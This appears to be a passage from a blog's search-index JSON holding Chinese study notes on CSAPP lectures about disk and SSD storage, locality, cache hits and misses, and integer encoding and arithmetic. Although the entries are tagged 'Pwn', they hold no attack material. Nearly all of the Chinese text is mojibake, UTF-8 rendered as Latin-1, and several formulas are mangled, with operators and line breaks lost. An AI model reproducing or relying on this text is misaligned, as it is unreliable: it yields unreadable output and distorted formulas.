çš„å¤æ‚æ€§ï¼Œç°ä»£ç£ç›˜å°†å…¶æŠ½è±¡ä¸ºBä¸ªæ‰‡åŒºå¤§å°çš„é€»è¾‘å—åºåˆ—ï¼Œç¼–å·ä¸º0,1,...,B-1ï¼Œé€šè¿‡ç£ç›˜ä¸­çš„ç£ç›˜æ§åˆ¶å™¨æ¥ç»´æŠ¤é€»è¾‘å—å·å’Œå®é™…æ‰‡åŒºä¹‹é—´çš„æ˜ å°„å…³ç³»ã€‚ä¸ºæ­¤éœ€è¦é€šè¿‡ç£ç›˜æ§åˆ¶å™¨å¯¹ç£ç›˜è¿›è¡Œæ ¼å¼åŒ–ï¼š ä¼šç”¨è¡¨ç¤ºæ‰‡åŒºçš„ä¿¡æ¯å¡«å†™åœ¨æ‰‡åŒºä¹‹é—´çš„é—´éš™ è¡¨ç¤ºå‡ºè¡¨é¢æœ‰æ•…éšœçš„æŸ±é¢ï¼Œå¹¶ä¸”ä¸è¿›è¡Œä½¿ç”¨ åœ¨æ¯ä¸ªåŒºä¼šé¢„ç•™ä¸€ç»„æŸ±é¢ä½œä¸ºå¤‡ç”¨ï¼Œæ²¡æœ‰æ˜ å°„ä¸ºé€»è¾‘å—ã€‚å½“æŸåæ—¶ï¼Œç£ç›˜æ§åˆ¶å™¨ä¼šå°†æ•°æ®å¤åˆ¶åˆ°å¤‡ç”¨æŸ±é¢ï¼Œåˆ™ç£ç›˜å°±å¯ä»¥ç»§ç»­æ­£å¸¸å·¥ä½œäº†ã€‚ å½“ä»ç£ç›˜è¯»å–æ•°æ®åˆ°ä¸»å­˜ï¼Œéœ€è¦ä»¥ä¸‹æ­¥éª¤ï¼š æ“ä½œç³»ç»Ÿå‘é€ä¸€ä¸ªå‘½ä»¤åˆ°ç£ç›˜æ§åˆ¶å™¨ï¼Œè¯»å–æŸä¸ªé€»è¾‘å—å· ç£ç›˜æ§åˆ¶å™¨ä¸Šçš„å›ºä»¶æ‰§è¡Œå¿«é€Ÿè¡¨æŸ¥æ‰¾ï¼Œå¾—åˆ°è¯¥é€»è¾‘å—å·ç¿»è¯‘æˆä¸€ä¸ªä¸‰å…ƒç»„ï¼ˆç›˜é¢ï¼Œç£é“ï¼Œæ‰‡åŒºï¼‰ ç£ç›˜æ§åˆ¶å™¨è§£é‡Šä¸‰å…ƒç»„ä¿¡æ¯ï¼Œå°†è¯»/å†™å¤´ç§»åŠ¨åˆ°å¯¹åº”çš„æ‰‡åŒº å°†è¯»å–åˆ°çš„ä¿¡æ¯æ”¾åˆ°ç£ç›˜æ§åˆ¶å™¨çš„ç¼“å†²åŒºä¸­ å°†ç¼“å†²åŒºä¸­çš„æ•°æ®ä¿å­˜åˆ°ä¸»å­˜ä¸­ã€‚ åœ¨å°†ç£ç›˜å†…å®¹ä¼ é€åˆ°ä¸»å­˜çš„è¿‡ç¨‹ä¸­ï¼Œä¸éœ€è¦ç»è¿‡CPUï¼Œå› ä¸ºç£ç›˜è¯»å–é€Ÿåº¦æ¯”CPUæ‰§è¡Œé€Ÿåº¦æ…¢å¾ˆå¤šï¼Œæ‰€ä»¥CPUä¼šå…ˆå»æ‰§è¡Œå…¶ä»–å·¥ä½œã€‚å½“ä¼ é€å®Œæˆåï¼Œç”±ç£ç›˜å‘é€ä¸€ä¸ªä¸­æ–­ä¿¡å·åˆ°CPUã€‚ ","date":"2021-01-25","objectID":"/csapp-lecture-06/:1:3","series":null,"tags":["Pwn"],"title":"CSAPP Lecture 06","uri":"/csapp-lecture-06/#ç£ç›˜å­˜å‚¨"},{"categories":["Pwning"],"content":"å›ºæ€å­˜å‚¨**å›ºæ€ç¡¬ç›˜ï¼ˆSolid State Diskï¼ŒSSDï¼‰**æ˜¯ä¸€ç§åŸºäºé—ªå­˜çš„å­˜å‚¨æŠ€æœ¯ï¼Œæ’åœ¨I/Oæ€»çº¿ä¸Šæ ‡å‡†ç¡¬ç›˜æ’æ§½ï¼ˆé€šå¸¸ä¸ºUSBæˆ–SATAï¼‰ï¼Œå¤„äºç£ç›˜å’ŒDRAMå­˜å‚¨å™¨çš„ä¸­é—´ç‚¹ã€‚ å®ƒç”±é—ªå­˜å’Œ**é—ªå­˜ç¿»è¯‘å±‚ï¼ˆFlash Translation Layerï¼‰**ç»„æˆ é—ªå­˜ç¿»è¯‘å±‚æ˜¯ä¸€ä¸ªç¡¬ä»¶/å›ºä»¶è®¾å¤‡ï¼Œç”¨æ¥å°†å¯¹é€»è¾‘å—çš„è¯·æ±‚ç¿»è¯‘æˆå¯¹åº•å±‚ç‰©ç†è®¾å¤‡çš„è®¿é—®ã€‚ é—ªå­˜çš„åŸºæœ¬å±æ€§å†³å®šäº†SSDéšæœºè¯»å†™çš„æ€§èƒ½ï¼Œé€šå¸¸ç”±Bä¸ªå—çš„åºåˆ—ç»„æˆï¼Œæ¯ä¸ªå—ç”±Pé¡µç»„æˆï¼Œé¡µä½œä¸ºæ•°æ®çš„å•ä½è¿›è¡Œè¯»å†™ã€‚é€šå¸¸é¡µå¤§å°ä¸º512å­—èŠ‚~4KBï¼Œå—ä¸­åŒ…å«32~128é¡µï¼Œåˆ™å—çš„å¤§å°æœ‰16KB~512KBã€‚ å½“å¯¹é¡µè¿›è¡Œå†™æ“ä½œæ—¶ï¼Œé¦–å…ˆéœ€è¦å…ˆå¯¹è¯¥é¡µæ‰€å¤„çš„æ•´ä¸ªå—è¿›è¡Œæ“¦é™¤ã€‚ SSDçš„ä¼˜ç¼ºç‚¹ï¼š **ä¼˜ç‚¹ï¼š**ç”±äºé—ªå­˜æ˜¯åŠå¯¼ä½“å­˜å‚¨å™¨ï¼Œæ²¡æœ‰ç§»åŠ¨çš„éƒ¨ä»¶ï¼Œæ‰€ä»¥é€Ÿåº¦æ¯”ç£ç›˜æ›´å¿«ä¸”ç£¨æŸå°ï¼Œèƒ½è€—ä½ **ç¼ºç‚¹ï¼š**SSDæ¯å­—èŠ‚æ¯”ç£ç›˜è´µå¤§çº¦30å€ï¼Œæ‰€ä»¥å¸¸ç”¨çš„å­˜å‚¨å®¹é‡æ¯”ç£ç›˜å°100å€å·¦å³ã€‚ ","date":"2021-01-25","objectID":"/csapp-lecture-06/:1:4","series":null,"tags":["Pwn"],"title":"CSAPP Lecture 06","uri":"/csapp-lecture-06/#å›ºæ€å­˜å‚¨"},{"categories":["Pwning"],"content":"å±€éƒ¨æ€§å…·æœ‰è‰¯å¥½**å±€éƒ¨æ€§ï¼ˆLocalityï¼‰**çš„ç¨‹åºï¼Œä¼šå€¾å‘äºå¼•ç”¨æœ€è¿‘å¼•ç”¨è¿‡çš„æ•°æ®é¡¹æœ¬èº«ï¼Œæˆ–è€…å¼•ç”¨æœ€è¿‘å¼•ç”¨è¿‡çš„æ•°æ®é¡¹å‘¨å›´çš„æ•°æ®é¡¹ã€‚å±€éƒ¨æ€§ä¸»è¦å…·æœ‰ä¸¤ç§å½¢å¼ï¼š **æ—¶é—´å±€éƒ¨æ€§ï¼ˆTemporal Localityï¼‰ï¼š**å¼•ç”¨è¿‡çš„æ•°æ®é¡¹åœ¨ä¸ä¹…ä¼šè¢«å¤šæ¬¡å¼•ç”¨ã€‚ **ç©ºé—´å±€éƒ¨æ€§ï¼ˆSpatial Localityï¼‰ï¼š**å¼•ç”¨è¿‡çš„æ•°æ®é¡¹ï¼Œåœ¨ä¸ä¹…ä¼šå¼•ç”¨é™„è¿‘çš„æ•°æ®é¡¹ã€‚ ä»ç¡¬ä»¶åˆ°æ“ä½œç³»ç»Ÿï¼Œå†åˆ°åº”ç”¨ç¨‹åºï¼Œéƒ½åˆ©ç”¨äº†å±€éƒ¨æ€§ **ç¡¬ä»¶ï¼š**åœ¨å¤„ç†å™¨å’Œä¸»å­˜ä¹‹é—´å¼•å…¥ä¸€ä¸ªå°è€Œå¿«é€Ÿçš„é«˜é€Ÿç¼“å­˜å­˜å‚¨å™¨ï¼Œæ¥ä¿å­˜æœ€è¿‘å¼•ç”¨çš„æŒ‡ä»¤å’Œæ•°æ®ï¼Œä»è€Œæé«˜å¯¹ä¸»å­˜çš„è®¿é—®é€Ÿåº¦ã€‚ **æ“ä½œç³»ç»Ÿï¼š**ç”¨ä¸»å­˜æ¥ç¼“å­˜è™šæ‹Ÿç©ºé—´ä¸­æœ€è¿‘è¢«å¼•ç”¨çš„æ•°æ®å—ã€‚ **åº”ç”¨ç¨‹åºï¼š**æ¯”å¦‚Webæµè§ˆå™¨ä¼šå°†æœ€è¿‘å¼•ç”¨çš„æ–‡æ¡£æ”¾å…¥æœ¬åœ°ç£ç›˜ä¸­ï¼Œæ¥ç¼“å­˜æœåŠ¡å™¨çš„æ•°æ®ã€‚ ä¸€ä¸ªä¾‹å­ï¼šæ•°ç»„çš„éå† ç›¸æ¯”äºé‡‡ç”¨åˆ—ä¼˜å…ˆéå†ï¼Œè¡Œä¼˜å…ˆéå†ä¼šæ›´å¿«ã€‚å› ä¸ºå­˜å‚¨å°±æ˜¯ä½¿ç”¨çš„è¡Œä¼˜å…ˆã€‚è·¨åˆ—çš„è®¿é—®ä¼šè·¨è¶Šæ›´å¤§çš„ç©ºé—´ï¼Œå½±å“è¯»å–é€Ÿåº¦ã€‚ ","date":"2021-01-25","objectID":"/csapp-lecture-06/:2:0","series":null,"tags":["Pwn"],"title":"CSAPP Lecture 06","uri":"/csapp-lecture-06/#å±€éƒ¨æ€§"},{"categories":["Pwning"],"content":"å­˜å‚¨å™¨çš„å±‚æ¬¡ç»“æ„å¦‚ä¸Šå›¾æ‰€ç¤ºæ˜¯ä¸€ç§ç»å…¸çš„å­˜å‚¨å™¨å±‚æ¬¡ç»“æ„ï¼Œä¼šä½¿ç”¨åŸºäºSRAMçš„é«˜é€Ÿç¼“å­˜å­˜å‚¨å™¨æ¥è§£å†³CPUå’ŒDRAMä¸»å­˜ä¹‹é—´çš„é¸¿æ²Ÿï¼Œ**é«˜é€Ÿç¼“å­˜ï¼ˆCacheï¼‰**æ˜¯ä¸€ä¸ªå°è€Œå¿«é€Ÿçš„å­˜å‚¨è®¾å¤‡ï¼Œç”¨æ¥å­˜æ”¾ä½¿ç”¨é¢‘ç‡å¤§çš„æ•°æ®ï¼Œæ¥ä½œä¸ºå­˜å‚¨åœ¨æ›´å¤§æ›´æ…¢è®¾å¤‡ä¸­çš„æ•°æ®å¯¹è±¡çš„ç¼“å†²åŒºåŸŸã€‚ å­˜å‚¨å™¨å±‚æ¬¡ç»“æ„çš„ä¸­å¿ƒæ€æƒ³æ˜¯è®©å±‚æ¬¡ç»“æ„ä¸­çš„æ¯ä¸€å±‚æ¥ç¼“å­˜ä½ä¸€å±‚çš„æ•°æ®å¯¹è±¡ï¼Œå°†ç¬¬kå±‚çš„æ›´å¿«æ›´å°çš„å­˜å‚¨è®¾å¤‡ä½œä¸ºç¬¬k+1å±‚çš„æ›´å¤§æ›´æ…¢çš„å­˜å‚¨è®¾å¤‡çš„ç¼“å­˜ã€‚ç›¸æ¯”äºç¬¬k+1å±‚çš„æ•°æ®ï¼Œç¨‹åºä¼šå€¾å‘äºè®¿é—®å­˜å‚¨åœ¨ç¬¬kå±‚çš„æ•°æ®ã€‚å¦‚æœæˆ‘ä»¬è®¿é—®ç¬¬k+1å±‚å­˜å‚¨çš„æ•°æ®ï¼Œæˆ‘ä»¬ä¼šå°†å…¶æ‹·è´åˆ°ç¬¬kå±‚ï¼Œå› ä¸ºæ ¹æ®å±€éƒ¨æ€§åŸç†æˆ‘ä»¬å¾ˆæœ‰å¯èƒ½å°†å†æ¬¡è®¿é—®è¯¥æ•°æ®ï¼Œç”±æ­¤æˆ‘ä»¬å°±èƒ½ä»¥ç¬¬kå±‚çš„è®¿é—®é€Ÿåº¦æ¥è®¿é—®æ•°æ®ã€‚è€Œä¸”å› ä¸ºæˆ‘ä»¬ä¸ç»å¸¸è®¿é—®ç¬¬k+1å±‚çš„æ•°æ®ï¼Œæˆ‘ä»¬å°±å¯ä»¥ä½¿ç”¨é€Ÿåº¦æ›´æ…¢ä¸”æ›´ä¾¿å®œçš„å­˜å‚¨è®¾å¤‡ã€‚ ä¸Šå›¾å±•ç¤ºçš„æ˜¯å­˜å‚¨å™¨å±‚æ¬¡ç»“æ„çš„åŸºæœ¬ç¼“å­˜åŸç†ã€‚æ¯ä¸€å±‚å­˜å‚¨å™¨éƒ½ä¼šè¢«åˆ’åˆ†æˆè¿ç»­çš„æ•°æ®å¯¹è±¡ç»„å—ï¼Œç§°ä¸ºå—ï¼ˆBlockï¼‰ï¼Œæ¯ä¸ªå—éƒ½æœ‰ä¸€ä¸ªå”¯ä¸€çš„åœ°å€æˆ–åå­—ï¼Œå¹¶ä¸”é€šå¸¸å—çš„å¤§å°éƒ½æ˜¯å›ºå®šçš„ã€‚ç¬¬kå±‚ä½œä¸ºç¬¬k+1å±‚çš„ç¼“å­˜ï¼Œæ•°æ®ä¼šä»¥å—å¤§å°ä½œä¸º**ä¼ é€å•å…ƒï¼ˆTransfer Unitï¼‰**åœ¨ç¬¬kå±‚å’Œç¬¬k+1å±‚ä¹‹é—´æ¥å›èµ‹å€¼ï¼Œä½¿å¾—ç¬¬kå±‚ä¿å­˜ç¬¬k+1å±‚å—çš„ä¸€ä¸ªå­é›†çš„å‰¯æœ¬ã€‚é€šå¸¸å­˜å‚¨å™¨å±‚æ¬¡ç»“æ„ä¸­è¾ƒä½å±‚çš„è®¾å¤‡çš„è®¿é—®æ—¶é—´è¾ƒé•¿ï¼Œæ‰€ä»¥è¾ƒä½å±‚ä¸­ä¼šä½¿ç”¨è¾ƒå¤§çš„å—ã€‚ ","date":"2021-01-25","objectID":"/csapp-lecture-06/:3:0","series":null,"tags":["Pwn"],"title":"CSAPP Lecture 06","uri":"/csapp-lecture-06/#å­˜å‚¨å™¨çš„å±‚æ¬¡ç»“æ„"},{"categories":["Pwning"],"content":"ç¼“å­˜å‘½ä¸­ ç¼“å­˜å‘½ä¸­ï¼ˆcache hitï¼‰ å½“ç¨‹åºéœ€è¦ç¬¬k+1å±‚çš„æŸä¸ªæ•°æ®å¯¹è±¡dæ—¶ï¼Œä¼šç°åœ¨ç¬¬kå±‚çš„å—ä¸­æœç´¢dï¼Œå¦‚æœdåˆšå¥½ç¼“å­˜åœ¨ç¬¬kå±‚ä¸­ï¼Œåˆ™æˆä¸ºç¼“å­˜å‘½ä¸­ï¼ˆCache Hitï¼‰ï¼Œåˆ™è¯¥ç¨‹åºä¼šç›´æ¥ä»ç¬¬kå±‚ä¸­è¯»å–dã€‚æ ¹æ®å­˜å‚¨å™¨å±‚æ¬¡ç»“æ„ï¼Œå¯ä»¥çŸ¥é“ç¬¬kå±‚çš„è¯»å–é€Ÿåº¦æ›´å¿«ï¼Œå› æ­¤ç¼“å­˜å‘½ä¸­ä¼šä½¿å¾—ç¨‹åºæ›´å¿«ã€‚ ç¼“å­˜ä¸å‘½ä¸­ï¼ˆcache missï¼‰ å¦‚æœç¬¬kå±‚æ²¡æœ‰ç¼“å­˜æ•°æ®å¯¹è±¡dï¼Œåˆ™ç§°ä¸ºç¼“å­˜ä¸å‘½ä¸­ï¼ˆCache Missï¼‰ï¼Œåˆ™ä¼šä»ç¬¬k+1å±‚ä¸­å–å‡ºåŒ…å«dçš„å—ï¼Œç„¶åç¬¬kå±‚çš„ç¼“å­˜ä¼šæ‰§è¡ŒæŸä¸ª**æ”¾ç½®ç­–ç•¥ï¼ˆPlacement Policyï¼‰**æ¥å†³å®šè¯¥å—è¦ä¿å­˜åœ¨ç¬¬kå±‚çš„ä»€ä¹ˆä½ç½® **éšæœºæ›¿æ¢ç­–ç•¥ï¼š**ä¼šéšæœºé€‰æ‹©ä¸€ä¸ªç‰ºç‰²å— **æœ€è¿‘æœ€å°‘è¢«ä½¿ç”¨ï¼ˆLRUï¼‰æ›¿æ¢ç­–ç•¥ï¼š**é€‰æ‹©æœ€åè¢«è®¿é—®çš„æ—¶é—´ç¦»ç°åœ¨æœ€è¿œçš„å— éšæœºæ”¾ç½®å—ä¼šä½¿å¾—å®šä½èµ·æ¥ä»£ä»·å¾ˆé«˜ã€‚ å¯ä»¥é‡‡ç”¨æ›´ä¸¥æ ¼çš„æ”¾ç½®ç­–ç•¥ï¼Œå°†ç¬¬k+1å±‚çš„æŸä¸ªå—é™åˆ¶æ”¾ç½®åœ¨ç¬¬kå±‚å—çš„ä¸€ä¸ªå°çš„å­é›†ä¸­ï¼Œæ¯”å¦‚ç¬¬k+1å±‚çš„ç¬¬iä¸ªå—ä¿å­˜åœ¨ç¬¬kå±‚çš„i mod 4ä¸­ã€‚ä½†æ˜¯è¯¥æ”¾ç½®ç­–ç•¥ä¼šå¼•èµ·å†²çªä¸å‘½ä¸­ï¼ˆConflict Missï¼‰ï¼Œæ­¤æ—¶ç¼“å†²åŒºè¶³å¤Ÿå¤§ï¼Œä½†æ˜¯ç”±äºéœ€è¦çš„å¯¹è±¡ä¼šåå¤æ˜ å°„åˆ°åŒä¸€ä¸ªç¼“å­˜å—ï¼Œä½¿å¾—ç¼“å­˜ä¸€ç›´ä¸å‘½ä¸­ã€‚æ­¤æ—¶å°±éœ€è¦ä¿®æ”¹æ”¾ç½®ç­–ç•¥ã€‚ æ¯”è¾ƒç‰¹æ®Šçš„æƒ…å†µæ˜¯ç¬¬kå±‚çš„ç¼“å­˜ä¸ºç©ºï¼Œé‚£ä¹ˆå¯¹äºä»»æ„çš„æ•°æ®å¯¹è±¡çš„è®¿é—®éƒ½ä¼šä¸å‘½ä¸­ã€‚ç©ºçš„ç¼“å­˜ç§°ä¸ºå†·ç¼“å­˜ï¼ˆCold Cacheï¼‰ï¼Œè¯¥ä¸å‘½ä¸­ç§°ä¸ºå¼ºåˆ¶æ€§ä¸å‘½ä¸­ï¼ˆCompulsory Missï¼‰æˆ–å†·ä¸å‘½ä¸­ï¼ˆCold Missï¼‰ã€‚ ç¨‹åºé€šå¸¸ä¼šæŒ‰ç…§ä¸€ç³»åˆ—é˜¶æ®µæ¥è¿è¡Œï¼Œæ¯ä¸ªé˜¶æ®µä¼šè®¿é—®ç¼“å­˜å—çš„æŸä¸ªç›¸å¯¹ç¨³å®šä¸å˜çš„é›†åˆï¼Œåˆ™è¯¥é›†åˆç§°ä¸ºå·¥ä½œé›†ï¼ˆWorking Setï¼‰ï¼Œå¦‚æœå·¥ä½œé›†å¤§å°è¶…è¿‡ç¼“å­˜å¤§å°ï¼Œåˆ™ç¼“å­˜ä¼šå‡ºç°å®¹é‡ä¸å‘½ä¸­ï¼ˆCapacity Missï¼‰ï¼Œè¿™æ˜¯ç”±ç¼“å­˜å¤ªå°å¯¼è‡´çš„ã€‚ ","date":"2021-01-25","objectID":"/csapp-lecture-06/:3:1","series":null,"tags":["Pwn"],"title":"CSAPP Lecture 06","uri":"/csapp-lecture-06/#ç¼“å­˜å‘½ä¸­"},{"categories":["Pwning"],"content":"Lecture 01:Bits,Bytes and Integer","date":"2021-01-20","objectID":"/csapp-lecture-01/:0:0","series":null,"tags":["Pwn"],"title":"CSAPP Lecture 01","uri":"/csapp-lecture-01/#lecture-01bitsbytes-and-integer"},{"categories":["Pwning"],"content":"å¤§ç«¯æ³•ä¸å°ç«¯æ³•å¯¹äº0x01234567ï¼Œæœ€é«˜æœ‰æ•ˆä¸º0x01ï¼Œæœ€ä½æœ‰æ•ˆä½ä¸º0x67 å¤§ç«¯æ³•ï¼š Â·Â·Â· 0x100 0x101 0x102 0x103 Â·Â·Â· Â·Â·Â· 01 23 45 67 Â·Â·Â· å°ç«¯æ³•ï¼š Â·Â·Â· 0x100 0x101 0x102 0x103 Â·Â·Â· Â·Â·Â· 67 45 23 01 Â·Â·Â· Windowsï¼ŒLinuxé‡‡ç”¨å°ç«¯æ³• ","date":"2021-01-20","objectID":"/csapp-lecture-01/:1:0","series":null,"tags":["Pwn"],"title":"CSAPP Lecture 01","uri":"/csapp-lecture-01/#å¤§ç«¯æ³•ä¸å°ç«¯æ³•"},{"categories":["Pwning"],"content":"Boolä»£æ•°\u0026ï¼šæŒ‰ä½ä¸ï¼Œ|ï¼šæŒ‰ä½æˆ–ï¼Œ^ï¼šæŒ‰ä½å¼‚æˆ–ï¼Œ~ï¼šå–å \u0026\u0026ï¼šä¸ï¼Œ||ï¼šæˆ–ï¼Œï¼ï¼šé ","date":"2021-01-20","objectID":"/csapp-lecture-01/:2:0","series":null,"tags":["Pwn"],"title":"CSAPP Lecture 01","uri":"/csapp-lecture-01/#boolä»£æ•°"},{"categories":["Pwning"],"content":"ç§»ä½è¿ç®—ï¼š$xÂ«k$ï¼Œ$x$å‘å·¦ç§»åŠ¨$k$ä½ï¼Œä¸¢å¼ƒæœ€é«˜çš„$k$ä½ï¼Œå¹¶åœ¨å³ç«¯è¡¥$k$ä¸ª0ã€‚ ç®—æœ¯å³ç§»ï¼š$xÂ»k$ï¼Œ$x$å‘å³ç§»åŠ¨$k$ä½ï¼Œä¸¢å¼ƒæœ€ä½çš„$k$ä½ï¼Œå¹¶åœ¨å·¦ç«¯è¡¥$k$ä¸ªæœ€é«˜æœ‰æ•ˆä½ã€‚ é€»è¾‘å³ç§»ï¼š$xÂ»k$ï¼Œ$x$å‘å³ç§»åŠ¨$k$ä½ï¼Œä¸¢å¼ƒæœ€ä½çš„$k$ä½ï¼Œå¹¶åœ¨å·¦ç«¯è¡¥$k$ä¸ª0ã€‚ x [01100011] [10010101] xÂ«4 [00110000] [01010000] xÂ»4(é€»è¾‘å³ç§») [00000110] [00001001] xÂ»4(ç®—æœ¯å³ç§») [00000110] [11110001] ","date":"2021-01-20","objectID":"/csapp-lecture-01/:3:0","series":null,"tags":["Pwn"],"title":"CSAPP Lecture 01","uri":"/csapp-lecture-01/#ç§»ä½è¿ç®—"},{"categories":["Pwning"],"content":"æ— ç¬¦å·æ•°çš„ç¼–ç $B2U_w(x)$=$$\\sum_{i=0}^{w-1}{x_i2^i}$$ï¼Œ$w$è¡¨ç¤ºæ•°$x$çš„ä½æ•° $B2U_4([1010])=12^3+02^2+12^1+02^0$=10 æ— ç¬¦å·æ•°ç¼–ç çš„å”¯ä¸€æ€§ï¼Œå‡½æ•°$B2U_w$æ˜¯ä¸€ä¸ªåŒå°„ã€‚ ","date":"2021-01-20","objectID":"/csapp-lecture-01/:4:0","series":null,"tags":["Pwn"],"title":"CSAPP Lecture 01","uri":"/csapp-lecture-01/#æ— ç¬¦å·æ•°çš„ç¼–ç "},{"categories":["Pwning"],"content":"è¡¥ç ç¼–ç $B2T_w(x)=-x_{w-1}2^{w-1}+\\sum_{i=0}^{w-2}{x_i2^i}$ï¼Œ$w$è¡¨ç¤ºæ•°$x$çš„ä½æ•° $B2T_4(1011)=-12^3+02^2+12^1+12^0=-8+0+2+1=-5$ è¡¥ç ç¼–ç çš„å”¯ä¸€æ€§ï¼Œå‡½æ•°$B2T_w(x)$æ˜¯ä¸€ä¸ªåŒå°„ã€‚ ","date":"2021-01-20","objectID":"/csapp-lecture-01/:5:0","series":null,"tags":["Pwn"],"title":"CSAPP Lecture 01","uri":"/csapp-lecture-01/#è¡¥ç ç¼–ç "},{"categories":["Pwning"],"content":"æœ‰ç¬¦å·ä¸æ— ç¬¦å·æ•°çš„è½¬æ¢$$T2U_w(x)=\\begin{cases} x+2^w,x\u003c0\\x,xâ‰¥0\\end{cases}$$ $$U2T_w(u)=\\begin{cases} u,uâ‰¤TMax_w\\u-2^w,uï¼TMax_w\\end{cases}$$ å¼ºåˆ¶ç±»å‹è½¬æ¢ï¼Œåªæ˜¯æ”¹å˜äº†ä½çš„è§£é‡Šæ–¹å¼ï¼Œä¸æ”¹å˜ä½å€¼ã€‚ ","date":"2021-01-20","objectID":"/csapp-lecture-01/:6:0","series":null,"tags":["Pwn"],"title":"CSAPP Lecture 01","uri":"/csapp-lecture-01/#æœ‰ç¬¦å·ä¸æ— ç¬¦å·æ•°çš„è½¬æ¢"},{"categories":["Pwning"],"content":"æ‰©å±•ä¸€ä¸ªæ•°å­—çš„ä½è¡¨è¾¾","date":"2021-01-20","objectID":"/csapp-lecture-01/:7:0","series":null,"tags":["Pwn"],"title":"CSAPP Lecture 01","uri":"/csapp-lecture-01/#æ‰©å±•ä¸€ä¸ªæ•°å­—çš„ä½è¡¨è¾¾"},{"categories":["Pwning"],"content":"æ— ç¬¦å·æ•°çš„é›¶æ‹“å±•å®½åº¦ä¸º$w$çš„ä½å‘é‡$u=[u_{w-1},u_{w-2},Â·Â·Â·ï¼Œu_0]$ï¼Œ å®½åº¦ä¸º$w^çš„ä½å‘é‡u^=[0,0,u_{w-1},u_{w-2},Â·Â·Â·,u_0]ï¼Œ$å…¶ä¸­$w^`ï¼w$. ","date":"2021-01-20","objectID":"/csapp-lecture-01/:7:1","series":null,"tags":["Pwn"],"title":"CSAPP Lecture 01","uri":"/csapp-lecture-01/#æ— ç¬¦å·æ•°çš„é›¶æ‹“å±•"},{"categories":["Pwning"],"content":"è¡¥ç æ•°çš„ç¬¦å·æ‹“å±•å®½åº¦ä¸º$w$çš„ä½å‘é‡$u=[u_{w-1},u_{w-2},Â·Â·Â·ï¼Œu_0]$ï¼Œ å®½åº¦ä¸º$w^çš„ä½å‘é‡u^=[u_{w-1},u_{w-1},u_{w-1},u_{w-2},Â·Â·Â·,u_0]$ï¼Œå…¶ä¸­$w^`ï¼w$. ","date":"2021-01-20","objectID":"/csapp-lecture-01/:7:2","series":null,"tags":["Pwn"],"title":"CSAPP Lecture 01","uri":"/csapp-lecture-01/#è¡¥ç æ•°çš„ç¬¦å·æ‹“å±•"},{"categories":["Pwning"],"content":"æˆªæ–­å°†æ•°ä»é«˜ä½å‘ä½ä½å¼ºåˆ¶è½¬æ¢æ—¶ï¼Œä¼šå‘ç”Ÿæˆªæ–­ï¼Œæˆªæ–­$k$ä½ï¼Œå³ä¸¢å¼ƒå…¶é«˜$k$ä½ã€‚å³ï¼Œè™½ç„¶åŸåœ°å€å‚¨å­˜çš„æ•°æ®æ²¡æœ‰å˜åŒ–ï¼Œä½†æ˜¯å…¶é«˜kä½å·²ç»æ²¡æœ‰äº†æ„ä¹‰ã€‚ ä¾‹å¦‚ï¼Œintè½¬shortã€‚ ","date":"2021-01-20","objectID":"/csapp-lecture-01/:8:0","series":null,"tags":["Pwn"],"title":"CSAPP Lecture 01","uri":"/csapp-lecture-01/#æˆªæ–­"},{"categories":["Pwning"],"content":"æ•´æ•°è¿ç®—","date":"2021-01-20","objectID":"/csapp-lecture-01/:9:0","series":null,"tags":["Pwn"],"title":"CSAPP Lecture 01","uri":"/csapp-lecture-01/#æ•´æ•°è¿ç®—"},{"categories":["Pwning"],"content":"æ— ç¬¦å·æ•°åŠ æ³•$$x+y^u_w=\\begin{cases} x+y,x+yï¼œ2^w\\x+y-2^w,2^wâ‰¤x+y\u003c2^{w+1}\\end{cases}$$ ","date":"2021-01-20","objectID":"/csapp-lecture-01/:9:1","series":null,"tags":["Pwn"],"title":"CSAPP Lecture 01","uri":"/csapp-lecture-01/#æ— ç¬¦å·æ•°åŠ æ³•"},{"categories":["Pwning"],"content":"æ— ç¬¦å·æ±‚å$$-x^u_w=\\begin{cases}x,x=0\\2^w-x,x\u003e0\\end{cases}$$ ","date":"2021-01-20","objectID":"/csapp-lecture-01/:9:2","series":null,"tags":["Pwn"],"title":"CSAPP Lecture 01","uri":"/csapp-lecture-01/#æ— ç¬¦å·æ±‚å"},{"categories":["Pwning"],"content":"è¡¥ç åŠ æ³•$$ x+y^t_w=\\begin{cases} x+y-2^w,2^{w-1}â‰¤x+y\\x+y,-2^{w-1}â‰¤x+y\u003c2^{w-1}\\x+y+2^w,x+y\u003c-2^{w-1}\\end{cases} $$ ","date":"2021-01-20","objectID":"/csapp-lecture-01/:9:3","series":null,"tags":["Pwn"],"title":"CSAPP Lecture 01","uri":"/csapp-lecture-01/#è¡¥ç åŠ æ³•"},{"categories":["Pwning"],"content":"è¡¥ç çš„é$$ -x^t_w=\\begin{cases}TMin_w,x=TMin_w\\-x,x\u003eTMin_w\\end{cases} $$ ","date":"2021-01-20","objectID":"/csapp-lecture-01/:9:4","series":null,"tags":["Pwn"],"title":"CSAPP Lecture 01","uri":"/csapp-lecture-01/#è¡¥ç çš„é"},{"categories":["Pwning"],"content":"æ— ç¬¦å·çš„ä¹˜æ³•$$ x*y^u_w=(xÂ·y)mod 2^w $$ ","date":"2021-01-20","objectID":"/csapp-lecture-01/:9:5","series":null,"tags":["Pwn"],"title":"CSAPP Lecture 01","uri":"/csapp-lecture-01/#æ— ç¬¦å·çš„ä¹˜æ³•"},{"categories":["Pwning"],"content":"è¡¥ç çš„ä¹˜æ³•$$x*y^t_w=U2T_w((xÂ·y)mod 2^w)$$ ","date":"2021-01-20","objectID":"/csapp-lecture-01/:9:6","series":null,"tags":["Pwn"],"title":"CSAPP Lecture 01","uri":"/csapp-lecture-01/#è¡¥ç çš„ä¹˜æ³•"},{"categories":["Pwning"],"content":"ä¸å¸¸æ•°çš„è¿ç®—å¯¹äºä»»æ„å¸¸æ•°çš„è¿ç®—åœ¨åé¢ä¼šè®²ï¼Œç±»ä¼¼è¿›è¡Œ$(aÂ«k)+b$,ä¾‹å¦‚$(aÂ«1)+a=3*a$ ç°åœ¨ä¸»è¦è€ƒè™‘ä¸2çš„å¹‚çš„è¿ç®—ï¼š ä¹˜æ³•ï¼š å®é™…å°±æ˜¯å¯¹å…¶äºŒè¿›åˆ¶è¡¨ç¤ºè¿›è¡Œå·¦ç§»æ“ä½œï¼Œå¯¹äºå›ºå®šå­—é•¿çš„æ•°éœ€è¦èˆå¼ƒè¶…å‡ºçš„ä½æ•°ã€‚ é™¤æ³•ï¼š å®é™…æ˜¯è¿›è¡Œå³ç§»æ“ä½œï¼Œå¯¹äºæ— 